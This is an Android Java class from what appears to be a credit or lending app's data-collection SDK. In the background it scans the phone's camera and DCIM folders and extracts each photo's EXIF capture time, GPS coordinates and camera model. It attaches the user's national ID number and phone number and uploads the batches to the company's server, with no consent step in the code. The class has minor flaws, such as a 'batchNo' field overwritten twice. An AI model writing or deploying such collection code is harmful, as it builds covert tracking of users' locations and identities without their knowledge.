package com.yxjr.credit.grab;

import java.io.File;
import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import com.yxjr.credit.constants.HttpConstant;
import com.yxjr.credit.constants.SpConstant;
import com.yxjr.credit.http.manage.NoConfineAsyncTask;
import com.yxjr.credit.log.YxLog;
import com.yxjr.credit.util.StringUtil;
import com.yxjr.credit.util.YxCommonUtil;
import com.yxjr.credit.util.YxStoreUtil;

import android.annotation.SuppressLint;
import android.content.Context;
import android.media.ExifInterface;
import android.os.Environment;
import android.os.StrictMode;

public class ImgExifGrab extends Grab {

	private int imgSize = 0;
	private Context mContext;
	java.text.DecimalFormat mDecimalFormat = new java.text.DecimalFormat("#.######");

	public ImgExifGrab(Context context) {
		this.mContext = context;
	}

	@Override
	public void upload() {
		new Task().execute();
	}

	private class Task extends NoConfineAsyncTask<String, String, String> {

		@Override
		protected String doInBackground(String... params) {
			try {
				int interval = getInterval(mContext, SpConstant.PSQ);
				boolean surpass = isSurpass(mContext, SpConstant.P);
				String exifTime = getLastTime(mContext, SpConstant.PLASTTIME);
				if (interval != 0 && surpass) {
					JSONArray exifArray = getData(exifTime);
					if (null != exifArray) {
						final String idCard = YxStoreUtil.get(mContext, SpConstant.PARTNER_ID_CARD_NUM);
						final String phoneNo = YxStoreUtil.get(mContext, SpConstant.PARTNER_PHONENUMBER);
						final UUID uuid = UUID.randomUUID();
						batchJSONArray(exifArray, interval, new OnBatchListener() {

							@Override
							public void onBatch(JSONArray array) {
								try {
									JSONObject exifInfo = new JSONObject();
									exifInfo.put("cert", idCard);
									exifInfo.put("batchNo", phoneNo);
									exifInfo.put("mobileNo", phoneNo);
									exifInfo.put("batchNo", uuid);
									exifInfo.put("count", imgSize);
									exifInfo.put("list", array);
									sendServer(mContext, HttpConstant.Request.SEND_IMG_EXIF, exifInfo);
								} catch (JSONException e) {
									e.printStackTrace();
								}
							}
						});
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
			return "";
		}
	}

	@Override
	public JSONArray getData(String time) {
		String imgPath = getImgPath();
		List<String> imgFiles = null;
		File file = new File(imgPath + "/Camera");//魅族没有这个目录
		if (file.exists()) {
			imgFiles = getImgFiles(file);
		} else {
			//Camera不是这个目录的话则会存在啥截屏等图片都会去获取
			imgFiles = getImgFiles(new File(imgPath));
		}
		//白色华为：
		//内置：storage/emulated/0
		//外置：storage/sdcard1
		//无奈的判断方法
		String sdPath1 = "/storage/sdcard1/DCIM/Camera";
		File fileSdPath1 = new File(sdPath1);
		if (fileSdPath1.exists()) {
			List<String> imgFiles1 = getImgFiles(fileSdPath1);
			if (imgFiles1.size() != 0) {
				for (String string : imgFiles1) {
					imgFiles.add(string);
				}
			}
		}

		JSONArray imgParam = new JSONArray();
		if (imgFiles != null) {
			imgSize = imgFiles.size();
			ExifInterface exifInterface = null;
			long timeLong = 0;
			if (YxCommonUtil.isNotBlank(time))
				timeLong = YxCommonUtil.dateStringToLong(time);
			for (int i = 0; i < imgFiles.size(); i++) {
				//				exifInterface = null;
				try {
					exifInterface = new ExifInterface(imgFiles.get(i));
				} catch (Exception e) {
					YxLog.e("get exif instantiation error");
					e.printStackTrace();
				}
				if (exifInterface != null) {
					if (timeLong != 0) {
						String datetime = exifInterface.getAttribute(ExifInterface.TAG_DATETIME);
						if (YxCommonUtil.isNotBlank(datetime)) {
							long datetimeLong = YxCommonUtil.dateStringToLong(datetime);
							//datetimeLong Date转long的时候，如果Date不是标准格式，则返回默认值0
							//因此如果获取照片的时间不标准，这里将每次都获取全量值。
							if (datetimeLong > timeLong) {
								imgParam.put(getImgParam(exifInterface));
							}
						}
					} else {
						imgParam.put(getImgParam(exifInterface));
					}
				}
			}
		}
		return imgParam;
	}

	private String getImgPath() {
		String path = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM).getAbsolutePath();
		return path == null ? "" : path;
	}

	@SuppressLint("DefaultLocale")
	private boolean checkImageFile(String fileName) {
		String fileEnd = fileName.substring(fileName.lastIndexOf(".") + 1, fileName.length()).toLowerCase();
		return fileEnd.equals("jpg") || fileEnd.equals("png") || fileEnd.equals("jpeg") ? true : false;
	}

	private List<String> getImgFiles(File fileAll) {
		List<String> imagePathList = new ArrayList<String>(); // 图片列表
		File[] files = fileAll.listFiles();// 将所有的文件存入List中,并过滤所有图片格式的文件
		if (files != null) {
			for (int i = 0; i < files.length; i++) {
				File file = files[i];
				if (file.isDirectory()) {
					File tempFile = new File(file.getPath());
					File[] tempFiles = tempFile.listFiles();
					for (File sfile : tempFiles) {
						if (checkImageFile(sfile.getPath())) {
							imagePathList.add(sfile.getPath());
						}
					}
				} else {
					if (checkImageFile(file.getPath())) {
						imagePathList.add(file.getPath());
					}
				}
			}
		}
		return imagePathList;// 返回得到的图片列表
	}

	private JSONObject getImgParam(ExifInterface exifInterface) {
		//必须加入下面两句，否则报错android.os.NetworkOnMainThreadException
		//StrictMode严格模式【监控】
		StrictMode.setThreadPolicy(new StrictMode.ThreadPolicy.Builder().detectDiskReads().detectDiskWrites().detectNetwork().penaltyLog().build());
		StrictMode.setVmPolicy(new StrictMode.VmPolicy.Builder().detectLeakedSqlLiteObjects().detectLeakedClosableObjects().penaltyLog().build());
		JSONObject json = new JSONObject();
		if (exifInterface != null) {
			String TAG_DATETIME = exifInterface.getAttribute(ExifInterface.TAG_DATETIME);//TAG_DATETIME     //时间日期 如：2017:08:07 11:31:14
			String TAG_GPS_LATITUDE = exifInterface.getAttribute(ExifInterface.TAG_GPS_LATITUDE);//TAG_GPS_LATITUDE //纬度 如：31/1,12/1,549864/10000
			String TAG_GPS_LONGITUDE = exifInterface.getAttribute(ExifInterface.TAG_GPS_LONGITUDE);//TAG_GPS_LONGITUDE //经度 如：121/1,31/1,519276/10000
			String TAG_MODEL = exifInterface.getAttribute(ExifInterface.TAG_MODEL);//TAG_MODEL //设备型号 如：MI 5
			String TAG_MAKE = exifInterface.getAttribute(ExifInterface.TAG_MAKE);//TAG_MAKE //设备制造商 如：Xiaomi
			try {
				json.put("cameraType", subStringByByte(TAG_MODEL, 300));//相机型号
				json.put("cameraBrand", subStringByByte(TAG_MAKE, 60));//相机厂商
				String dateTime;
				if (TAG_DATETIME != null) {
					long dateStringToLong = YxCommonUtil.dateStringToLong(TAG_DATETIME);
					if (dateStringToLong != 0) {
						dateTime = YxCommonUtil.formatDateTime(dateStringToLong);//照片拍摄时间//格式化时间
					} else {
						dateTime = TAG_DATETIME;//照片拍摄时间//格式化时间不符合规范
					}
				} else {
					dateTime = TAG_DATETIME;//照片拍摄时间//格式化时间不符合规范
				}
				json.put("shootTime", subStringByByte(dateTime, 30));//照片拍摄时间//格式化时间
				json.put("shootLng", subStringByByte(formatToTen(TAG_GPS_LONGITUDE), 30));//照片拍摄的经度
				json.put("shootLat", subStringByByte(formatToTen(TAG_GPS_LATITUDE), 30));//照片拍摄的纬度
			} catch (JSONException e) {
				YxLog.e("get imgParam json error");
				e.printStackTrace();
			}
		}
		return json;
	}

	@SuppressLint("DefaultLocale")
	private String formatToTen(String str) {
		try {
			if (!StringUtil.isEmpty(str)) {
				if (str.contains(",")) {
					int count, frist, two;
					count = frist = two = 0;
					for (int i = 0; i < str.length(); i++) {//看看有几个逗号，并记录下下标值
						if (str.charAt(i) == ',') {
							count++;
							if (frist == 0)
								frist = i;
							if (frist != 0)
								two = i;
						}
					}
					if (count == 2) {
						String a = str.substring(0, frist);
						String b = str.substring(frist + 1, two);
						String c = str.substring(two + 1, str.length());
						double a0, b0, c0;
						a0 = b0 = c0 = -999;
						if (!StringUtil.isEmpty(a) && !StringUtil.isEmpty(b) && !StringUtil.isEmpty(c)) {
							if (a.contains("/")) {
								String a1 = a.substring(0, a.indexOf("/"));
								String a2 = a.substring(a.indexOf("/") + 1, a.length());
								int ai1 = Integer.parseInt(a1);
								int ai2 = Integer.parseInt(a2);
								a0 = (double) ai1 / ai2;
							}
							if (b.contains("/")) {
								String b1 = b.substring(0, b.indexOf("/"));
								String b2 = b.substring(b.indexOf("/") + 1, b.length());
								int bi1 = Integer.parseInt(b1);
								int bi2 = Integer.parseInt(b2);
								b0 = (double) bi1 / bi2;
							}
							if (c.contains("/")) {
								String c1 = c.substring(0, c.indexOf("/"));
								String c2 = c.substring(c.indexOf("/") + 1, c.length());
								int ci1 = Integer.parseInt(c1);
								int ci2 = Integer.parseInt(c2);
								c0 = (double) ci1 / ci2;
							}
							if (a0 != -999 && b0 != -999 && c0 != -999) {
								double abc;
								if (a0 < 0)
									abc = -(Math.abs(a0) + (Math.abs(b0) + (Math.abs(c0) / 60)) / 60);
								else
									abc = Math.abs(a0) + (Math.abs(b0) + (Math.abs(c0) / 60)) / 60;
								str = String.valueOf(mDecimalFormat.format(abc));
							}
						}
					}
				}
			}
		} catch (Exception e) {
			e.printStackTrace();
			YxLog.e("");
		}

		return str;
	}
}
